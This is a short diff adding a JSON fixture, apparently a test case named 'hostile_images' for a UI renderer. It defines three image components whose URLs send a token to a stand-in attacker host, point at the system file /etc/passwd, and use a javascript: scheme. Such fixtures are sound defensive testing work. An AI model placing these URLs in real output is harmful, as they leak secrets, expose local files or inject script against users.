@@ -1,0 +1,6 @@
+{"surfaceId": "hostile_images", "components": [
+  {"id": "root", "component": "Column", "children": ["remote", "local", "scheme"]},
+  {"id": "remote", "component": "Image", "url": "https://evil.example/collect.png?token=SECRET"},
+  {"id": "local", "component": "Image", "url": "file:///etc/passwd"},
+  {"id": "scheme", "component": "Image", "url": "javascript:alert(1)"}
+]}
